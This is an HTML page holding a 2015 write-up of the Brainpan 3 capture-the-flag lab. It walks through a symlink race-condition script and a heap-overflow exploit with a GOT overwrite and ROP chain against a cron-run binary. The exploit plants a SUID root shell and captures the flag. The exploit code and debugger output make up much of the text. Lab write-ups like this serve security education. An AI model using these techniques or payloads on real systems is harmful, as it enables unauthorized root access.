@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Brainpan: 3 - Part 2 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-09-26">September 26, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/brainpan">brainpan</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Brainpan: 3 - Part 2</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Now that we&rsquo;ve popped <code>anansi</code> and <code>reynard</code>, it&rsquo;s time to go after <code>puck</code> and <code>root</code>!</p>
+
+<p>There is something listening on the loopback at port <code>7075</code>.  When we connect, we get a message about a key.</p>
+
+<pre><code class="language-text">$ netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN
+
+$ nc localhost 7075
+Incorrect key
+</code></pre>
+
+<p>The first step is to find the service which is bound to the port.  I did it by finding where the binary on port <code>1337</code> was, and it happened to be in the same location.  Lucky.</p>
+
+<pre><code class="language-text">$ ps aux
+anansi    1070  0.0  0.1   2044   556 ?        Ss   08:30   0:00 brainpan3
+
+$ ls -l /proc/1070/exe
+lrwxrwxrwx 1 anansi webdev 0 Sep 26 08:56 /proc/1070/exe -&gt; /usr/local/sbin/brainpan3
+
+$ ls -l /usr/local/sbin
+total 32
+-rwxr-xr-x 1 root root 16589 May 26 18:38 brainpan3
+-rwxr-xr-x 1 root root  7609 May 20 10:18 trixd
+-rwxr-xr-x 1 root root   343 May 21 11:38 www
+</code></pre>
+
+<p>Transfer <code>trixd</code> for analysis.  If we just run it, we drop into a shell.  Also, if we run <code>strings</code> we see some familiar bit and bobs - confirming we have the correct binary.</p>
+
+<pre><code class="language-text">root@kali:~# ./trixd 
+open: No such file or directory
+open: No such file or directory
+Authentication successful
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@kali:~/bp3# strings trixd 
+/mnt/usb/key.txt
+Key file is compromised.
+/home/puck/key.txt
+open
+Authentication successful
+/bin/sh
+Incorrect key
+</code></pre>
+
+<p>So the binary does a string compare between <code>/home/puck/key.txt</code> and <code>/mnt/usb/key.txt</code>, if they match <code>/bin/sh</code> is executed.  We can write to <code>/mnt/usb/</code>, so the obvious solution is to drop in a symlink&hellip;</p>
+
+<pre><code class="language-text">$ ls -lR /mnt/
+/mnt/:
+total 4
+drwxrwx--- 2 reynard dev 4096 Jun 17 22:11 usb
+
+/mnt/usb:
+total 4
+-rw-r--r-- 1 reynard reynard 21 Jun 17 22:11 key.txt
+</code></pre>
+
+<pre><code class="language-text">$ rm /mnt/usb/key.txt
+$ ln -s /home/puck/key.txt /mnt/usb/key/txt
+
+$ ls -l /mnt/usb/
+lrwxrwxrwx 1 reynard webdev 18 Sep 26 09:16 key.txt -&gt; /home/puck/key.txt
+
+$ nc localhost 7075
+Key file is compromised.
+</code></pre>
+
+<p>Bawwww :(  The binary is wise to us.  Now&hellip; the bitch about this is that it&rsquo;s been compiled with a ptrace trap, which means we can&rsquo;t easily debug it.  So I kinda went on blind faith here (and a hint from barrebas).  The symlink check is called before the string compare.  So if we are quick enough, we can place a file there to pass the symlink check, then swap it for a symlink.  This is called a race condition.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-3/speedy-gonzales.jpg"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="a-race-to-win:f6785c09a6136b44cc09f2d03fcc82fd">A Race to Win</h2>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import os, time
+
+while True:
+        os.mknod('/mnt/usb/key.txt', 0666)
+        time.sleep(0.1)
+        os.remove('/mnt/usb/key.txt')
+        os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')
+        time.sleep(0.1)
+        os.remove('/mnt/usb/key.txt')
+</code></pre>
+
+<p>Then in another shell&hellip;</p>
+
+<pre><code class="language-text">$ while :; do nc localhost 7075; done 
+Incorrect key
+Incorrect key
+Incorrect key
+Authentication successful
+$ id
+uid=1001(puck) gid=1004(dev) groups=1001(puck)
+</code></pre>
+
+<h2 id="path-to-root:f6785c09a6136b44cc09f2d03fcc82fd">Path to Root</h2>
+
+<p>Now that we can read inside <code>puck's</code> home directory, we can get the content of <code>key.txt</code>.  I found it handy to grab this in case I lost shell access - you can write the content into <code>/mnt/usb/key.txt</code> so you don&rsquo;t have to win the race condition over again.</p>
+
+<pre><code class="language-text">$ cat /home/puck/key.txt
+HBN48HY71ERG5GA6290V
+</code></pre>
+
+<p>If we check out the following cronjob and follow the trail&hellip;</p>
+
+<pre><code class="language-text">$ ls -l /etc/cron.d/
+-rw-r--r-- 1 root root 100 May 19 18:25 msg_admin
+
+$ cat /etc/cron.d/msg_admin
+* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
+
+$ ls -laR /opt
+drwxrwx---  3 root dev  4096 Jun 10 22:32 .messenger
+
+/opt/.messenger:
+drwx------ 2 root root 4096 Jun 10 22:32 NOTIFY
+
+$ ls -l /usr/local/bin/msg_admin
+-rwxr-xr-x 1 root root 12316 May 31 04:46 /usr/local/bin/msg_admin
+</code></pre>
+
+<h2 id="a-heap-of-trouble:f6785c09a6136b44cc09f2d03fcc82fd">A Heap of Trouble</h2>
+
+<pre><code class="language-text">root@kali:~/bp3# ./msg_admin 
+Usage: ./msg_admin priority message.txt
+Message file format: requestername|message
+Eg: tony|Add a new user to repo
+Can have multiple messages in a single file separated by newlines.
+Eg: tony|Please remove /tmp/foo
+    cate|Reset password request.
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/bp3# file msg_admin 
+msg_admin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb794eca10a43b1fd6f55c5959d818be9c5f70d0, not stripped
+
+gdb-peda$ checksec 
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+
+<p>After disassembling the binary, we work out that messages are stored on the heap.  I think 10 bytes are assigned for the <code>requestorname</code> and 200 for the <code>message</code>.  If we submit two messages and inspect the heap, we can see where the data is stored.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += &quot;B&quot; * 200
+buf += &quot;\n&quot;
+
+buf += &quot;C&quot; * 10
+buf += &quot;|&quot;
+buf += &quot;D&quot; * 200
+
+f = open(&quot;message.txt&quot;, w)
+f.write(buf)
+f.close()
+</code></pre>
+
+<pre><code class="language-text">gdb-peda$ r 1 message.txt
+</code></pre>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-3/heap-layout.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I&rsquo;ve highlighted the various pointers - you can see how they point to the start of the <code>requestorname</code> and <code>message</code> inputs.  We can add more byes to message 1, and have it overflow the pointer for message 2 requestorname.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += &quot;B&quot; * 212
+buf += &quot;XXXX&quot;
+buf += &quot;\n&quot;
+
+buf += &quot;C&quot; * 10
+buf += &quot;|&quot;
+buf += &quot;D&quot; * 200
+
+f = open(&quot;message.txt&quot;, w)
+f.write(buf)
+f.close()
+</code></pre>
+
+<pre><code class="language-text">EAX: 0x43434343 ('CCCC')
+EBX: 0x804c170 (&quot;CCCCCCCCCC&quot;)
+ECX: 0x804c170 (&quot;CCCCCCCCCC&quot;)
+EDX: 0x58585858 ('XXXX')
+
+gdb-peda$ x/120wx 0x804c388
+0x804c388:	0x00000001	0x0804c398	0x0804c3a8	0x00000011
+0x804c398:	0x41414141	0x41414141	0x00004141	0x000000d1
+0x804c3a8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3b8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3c8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3d8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3e8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3f8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c408:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c418:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c428:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c438:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c448:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c458:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c468:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c478:	0x42424242	0x58585858	0x0804c400
+</code></pre>
+
+<p>I&rsquo;ll overwrite this pointer with <code>strtok</code> from the <code>GOT</code>.</p>
+
+<pre><code class="language-text">root@kali:~/bp3# objdump -R msg_admin
+
+msg_admin:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+0804affc R_386_GLOB_DAT    __gmon_start__
+0804b00c R_386_JUMP_SLOT   getline
+0804b010 R_386_JUMP_SLOT   printf
+0804b014 R_386_JUMP_SLOT   fclose
+0804b018 R_386_JUMP_SLOT   time
+0804b01c R_386_JUMP_SLOT   uname
+0804b020 R_386_JUMP_SLOT   __stack_chk_fail
+0804b024 R_386_JUMP_SLOT   rewind
+0804b028 R_386_JUMP_SLOT   strcat
+0804b02c R_386_JUMP_SLOT   strcpy
+0804b030 R_386_JUMP_SLOT   malloc
+0804b034 R_386_JUMP_SLOT   puts
+0804b038 R_386_JUMP_SLOT   __gmon_start__
+0804b03c R_386_JUMP_SLOT   strftime
+0804b040 R_386_JUMP_SLOT   localtime
+0804b044 R_386_JUMP_SLOT   strlen
+0804b048 R_386_JUMP_SLOT   __libc_start_main
+0804b04c R_386_JUMP_SLOT   atol
+0804b050 R_386_JUMP_SLOT   fopen
+0804b054 R_386_JUMP_SLOT   memset
+0804b058 R_386_JUMP_SLOT   strncpy
+0804b05c R_386_JUMP_SLOT   strtok
+0804b060 R_386_JUMP_SLOT   fputs
+0804b064 R_386_JUMP_SLOT   strncat
+</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+from pwn import *
+
+_strtok = 0x0804b05c
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += &quot;B&quot; * 212
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+
+buf += &quot;CCCC&quot;
+buf += &quot;|&quot;
+buf += &quot;D&quot; * 200
+
+f = open(&quot;message.txt&quot;, &quot;w&quot;)
+f.write(buf)
+f.close()
+</code></pre>
+
+<pre><code class="language-text">Stopped reason: SIGSEGV
+0x43434343 in ?? ()
+</code></pre>
+
+<p>Now that we have control over EIP, the real work begins.  We have <code>NX</code> and <code>ASLR</code> to bypass, so we&rsquo;ll be ROP&rsquo;ing our way down victory lane.  First, let&rsquo;s find a pop ret gadget, to keep our stack aligned and maintain execution flow.  We&rsquo;ve crashed on our <code>C's</code>, so this gadget will go here.</p>
+
+<pre><code class="language-text">root@kali:~# /opt/ropeme/ropeme/ropshell.py 
+ROPeMe&gt; generate /root/bp3/msg_admin 30
+ROPeMe&gt; search pop %
+0x8048ddcL: pop ebx ; pop esi ; pop edi ; pop ebp ;;
+</code></pre>
+
+<pre><code class="language-python">_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += &quot;B&quot; * 212
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+buf += p32(_ppppr)
+buf += &quot;|&quot;
+buf += &quot;D&quot; * 200
+</code></pre>
+
+<pre><code class="language-text">Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre>
+
+<p>After the <code>ppppr</code>, we return into our stack of <code>B's</code>, so the rest of our payload will go into the body of <code>message 1</code>.  We should now return here each time.</p>
+
+<p>There isn&rsquo;t a call to <code>system</code> anywhere in the binary, so we have to construct our own ROP chain to get its address EAX, then <code>call eax</code>.  Let&rsquo;s find some gadgets that may be useful in this quest.</p>
+
+<pre><code class="language-text">ROPeMe&gt; search mov eax %
+ROPeMe&gt; search add eax %
+ROPeMe&gt; search sub eax %
+ROPeMe&gt; search pop ebx %
+ROPeMe&gt; search call eax %
+</code></pre>
+
+<p>I figure we should get an address of another GOT into EAX, calculate its offset to system and modify EAX accordingly.  I don&rsquo;t think the <code>sub eax</code> gadget is useable, so I need a GOT entry which is <em>smaller</em> than system, then <em>add</em> to it.</p>
+
+<p>I found a way to do this quite nicely using <code>pwntools</code>.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+from pwn import *
+
+elf = ELF('/root/bp3/msg_admin')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+print &quot;[+] System is at &quot; + hex(libc.symbols['system'])
+
+for symbol in elf.symbols:
+        try: print &quot;\t[&gt;] &quot; + symbol + &quot; is at &quot; + hex(libc.symbols[symbol])
+        except: pass
+
+print &quot;\n&quot;
+
+for symbol in elf.symbols:
+        try:
+                if libc.symbols[symbol] &lt; libc.symbols['system']:
+                        print &quot;[+] &quot; + symbol + &quot; is lower: &quot; + hex(libc.symbols[symbol])
+        except: pass
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/bp3# ./libc.py 
+[+] System is at 0x3de10
+    [&gt;] fclose is at 0x10ea80
+    [&gt;] uname is at 0xa0590
+    [&gt;] __libc_start_main is at 0x19630
+    [&gt;] printf is at 0x4c970
+    [&gt;] fopen is at 0x10e840
+    [&gt;] strncpy is at 0x7a040
+    [&gt;] puts is at 0x64ab0
+    [&gt;] strtok is at 0x7b170
+    [&gt;] fputs is at 0x63560
+    [&gt;] getline is at 0x60b60
+    [&gt;] localtime is at 0x91690
+    [&gt;] atol is at 0x2f2c0
+    [&gt;] __stack_chk_fail is at 0xe5790
+    [&gt;] malloc is at 0x758c0
+    [&gt;] memset is at 0x7b6c0
+    [&gt;] strcat is at 0x79350
+    [&gt;] got.malloc is at 0x16d014
+    [&gt;] strlen is at 0x79d10
+    [&gt;] strncat is at 0x79e80
+    [&gt;] rewind is at 0x6af60
+    [&gt;] strcpy is at 0x79740
+    [&gt;] time is at 0x91f00
+    [&gt;] strftime is at 0x97c00
+
+
+[+] __libc_start_main is lower: 0x19630
+[+] atol is lower: 0x2f2c0
+</code></pre>
+
+<p>Only <code>atol</code> is lower than <code>system</code>, kinda made me think I was on the right track.  The difference between <code>0x3de10</code> and <code>0x2f2c0</code> is <code>0xeb50</code>.  First, we want to clear EAX to 0, so it&rsquo;s in a nice state to work with.</p>
+
+<p>There&rsquo;s a pretty handy gadget that&rsquo;ll do that for us:
+<code>0x8048790L: mov eax 0x804b074 ; sub eax 0x804b074</code></p>
+
+<pre><code class="language-python">_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074 
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += p32(_0eax)
+buf += &quot;B&quot; * (212 - 4)
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+buf += p32(_ppppr)
+</code></pre>
+
+<p>I let it SEGFAULT again, but we can now see&hellip; <code>EAX: 0x0</code>.  Good.  Now let&rsquo;s throw in our <code>pop ebx</code> gadget and address for <code>atol</code>.</p>
+
+<pre><code class="language-python">_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol)
+buf += &quot;B&quot; * (212 - 12)
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+buf += p32(_ppppr)
+</code></pre>
+
+<p>This time, when we crash:</p>
+
+<pre><code class="language-text">EAX: 0x0 
+EBX: 0x804b04c --&gt; 0xb7e3f820 (&lt;atol&gt;:	sub    esp,0x1c)
+</code></pre>
+
+<p>Now the <code>add eax</code>, but there&rsquo;s a slight twist here.  The gadget I&rsquo;m using is: <code>add eax [ebx+0x1270304]</code> - it will take whatever is in EBX, add 0x1270304 to it, then put it in EAX.  It means that I have to subtract this value away from <code>atol</code> to compensate.</p>
+
+<pre><code class="language-python">_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d 
+_addeax = 0x8048feb             # add eax [ebx+0x1270304]
+_offset = 0x1270304
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol - _offset)
+buf += p32(_addeax)
+buf += &quot;B&quot; * (212 - 16)
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+buf += p32(_ppppr)
+</code></pre>
+
+<p>Crash, and: <code>EAX: 0xb7e3f820 (&lt;atol&gt;:   sub    esp,0x1c)</code>.  So far, so good!  I&rsquo;ve already established the amount I need to add, so I need to find values within the binary that I can use that will add up to <code>0xeb50</code>.  The closest I could find was: <code>0x8049f67 --&gt; 0xeb00</code> and <code>0x8048130 --&gt; 0x10</code>.  Let&rsquo;s add all of those in and see what happens.</p>
+
+<pre><code class="language-python">_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d
+_addeax = 0x8048feb             # add eax [ebx+0x1270304]
+_offset = 0x1270304
+
+_eb00 = 0x8049f67
+_10 = 0x8048130
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_eb00 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += &quot;B&quot; * (212 - 76)
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+buf += p32(_ppppr)
+</code></pre>
+
+<p>Crash:  <code>EAX: 0xb7e4e360 (&lt;__libc_system&gt;:  push   ebx)</code>.  We&rsquo;re on the home straight now.</p>
+
+<p>We need an argument to put into system - luckily there&rsquo;s a static reference to <code>/tmp/foo</code> in the binary - if you recall its help message.  <code>0x8048eef (&quot;/tmp/foo&quot;)</code>.</p>
+
+<pre><code class="language-python">_calleax = 0x8048786            # call eax ; leave
+_foo = 0x8048eef
+
+buf += p32(_calleax)
+buf += p32(_foo)
+</code></pre>
+
+<pre><code class="language-text">gdb-peda$ r 1 message.txt 
+Starting program: /root/bp3/msg_admin 1 message.txt
+[+] Recording 2 entries
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>So it works on my local box - I just copied <code>/bin/sh</code> as a simple test.  Time to copy <code>message.txt</code> across to bp3 (again with <code>xxd</code>).  For the cronjob to pick it up, it must be within <code>/opt/.messenger/</code> and have the <code>.msg</code> extension.  You know the job has run, because after the message has been processed, it gets deleted.</p>
+
+<h2 id="failed:f6785c09a6136b44cc09f2d03fcc82fd">Failed?</h2>
+
+<p>My <code>/tmp/foo</code> payload on bp3 was to create a SUID shell.</p>
+
+<pre><code class="language-text">cp /bin/sh /tmp/pwn
+chmod 4777 /tmp/pwn
+</code></pre>
+
+<p>But unfortunately it wasn&rsquo;t working :( I tried copying it in a few times - it would get deleted, but there was no SUID shell in <code>/tmp</code>.</p>
+
+<p>I had a look at <code>libc</code> on bp3 and found that the offsets between <code>atol</code> and <code>system</code> was different than on my box.  *sigh*.</p>
+
+<pre><code class="language-text">$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep atol
+  1778: 00031890    35 FUNC    GLOBAL DEFAULT   12 atol@@GLIBC_2.0
+
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+  620: 00040190    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+</code></pre>
+
+<p>The difference here is <code>0xE8D0</code>!  This meant I had to go back and find new values for my increments, which turned out to be a good thing because I found a way to do it in just two adds.</p>
+
+<p>This is my final exploit:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+from pwn import *
+
+_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d
+_addeax = 0x8048feb             # add eax [ebx+0x1270304]
+_offset = 0x1270304
+_calleax = 0x8048786            # call eax ; leave
+
+_e800 = 0x80480c7
+_100 = 0x8048013
+
+_foo = 0x8048eef
+
+buf = &quot;A&quot; * 10
+buf += &quot;|&quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_e800 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_100 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_calleax)
+buf += p32(_foo)
+
+buf += &quot;B&quot; * (212 - 48)
+buf += p32(_strtok)
+buf += &quot;\n&quot;
+
+buf += p32(_ppppr)
+buf += &quot;|&quot;
+buf += &quot;D&quot; * 200
+
+f = open(&quot;message.txt&quot;, &quot;w&quot;)
+f.write(buf)
+f.close()
+</code></pre>
+
+<pre><code class="language-text">$ ls -l /tmp
+-rwxr-xr-x 1 puck dev      40 Oct  9 15:15 foo
+-rwsrwxrwx 1 root root 112204 Oct  9 22:31 pwn
+</code></pre>
+
+<pre><code class="language-text">$ /tmp/pwn
+$ id
+uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)
+
+$ ls -l /root
+-rw------- 1 root root 314 Jun 23 12:45 brainpan.8.gz
+</code></pre>
+
+<p>Unzip the file, then check it out.</p>
+
+<pre><code class="language-text">root@kali:~/bp3# man ./brainpan.8 
+
+DESCRIPTION
+       Congratulations, you win! Thanks for playing!
+
+FLAG
+       flag{tricksy-hobbitses-use-unix}
+
+BUGS
+       You found them all.
+
+AUTHOR
+       superkojiman - http://blog.techorganic.com
+
+TESTERS
+       Special thanks go to barrebas and Swappage taking the time to test Brainpan 3!
+       barrebas - https://twitter.com/barrebas
+       Swappage - https://twitter.com/Swappage
+</code></pre>
+
+<p>I am now going on an extended leave of absense to recover.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
